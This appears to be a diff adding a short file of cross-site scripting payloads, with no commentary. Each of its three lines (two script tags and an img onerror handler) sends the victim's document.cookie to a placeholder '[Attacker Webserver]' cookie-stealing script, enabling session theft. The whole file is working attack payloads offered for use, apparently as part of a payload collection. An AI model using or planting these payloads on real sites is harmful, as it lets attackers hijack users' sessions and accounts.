@@ -1,0 +1,5 @@
+<script javascript:text>document.location="http://[Attacker Webserver]/cookiestealing.php?c=" + document.cookie + "&t=Alert"; </script>
+
+<script>document.location='http://[Attacker Webserver]/cookiestealing.php?c=' + document.cookie</script>
+
+<img src=x onerror=this.src='http://[Attacker Webserver]/cookiestealing.php?c='+document.cookie>
